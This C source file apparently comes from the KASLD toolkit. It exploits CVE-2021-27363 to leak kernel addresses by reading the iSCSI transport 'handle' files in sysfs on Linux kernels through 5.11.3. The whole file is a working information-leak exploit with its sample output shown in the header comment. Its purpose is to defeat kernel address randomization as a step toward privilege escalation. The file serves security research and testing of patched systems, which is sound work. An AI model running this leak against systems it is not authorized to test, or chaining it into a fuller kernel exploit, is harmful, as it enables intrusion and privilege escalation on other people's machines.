// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel pointer to iscsi_transport struct (CVE-2021-27363)
// from /sys/class/iscsi_transport/<transport>/handle in kernels
// through 5.11.3. Discovered by Adam Nichols of GRIMM.
//
// Patched March 2021.
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-27363
// https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
//
// Output:
// [.] checking /sys/class/iscsi_transport/iser/handle ...
// leaked iscsi_iser_transport address: ffffffffc067b040
// [.] checking /sys/class/iscsi_transport/tcp/handle ...
// leaked iscsi_sw_tcp_transport address: ffffffffc0634020
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "kasld.h"

unsigned long get_kernel_addr_iscsi_iser_transport() {
  char* path = "/sys/class/iscsi_transport/iser/handle";

  printf("[.] checking %s ...\n", path);

  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  unsigned int buff_len = 1024;
  char buff[buff_len];

  if (fgets(buff, buff_len, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    fclose(f);
    return 0;
  }

  fclose(f);

  if (strlen(buff) > 21)
    return 0;

  char *endptr;
  unsigned long addr = (unsigned long)strtoull(buff, &endptr, 10);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long get_kernel_addr_iscsi_sw_tcp_transport() {
  char* path = "/sys/class/iscsi_transport/tcp/handle";

  printf("[.] checking %s ...\n", path);

  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  unsigned int buff_len = 1024;
  char buff[buff_len];

  if (fgets(buff, buff_len, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    fclose(f);
    return 0;
  }

  fclose(f);

  if (strlen(buff) > 21)
    return 0;

  char *endptr;
  unsigned long addr = (unsigned long)strtoull(buff, &endptr, 10);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr;

  addr = get_kernel_addr_iscsi_iser_transport();
  if (addr)
    printf("leaked iscsi_iser_transport address: %lx\n", addr);

  addr = get_kernel_addr_iscsi_sw_tcp_transport();
  if (addr)
    printf("leaked iscsi_sw_tcp_transport address: %lx\n", addr);

  return 0;
}
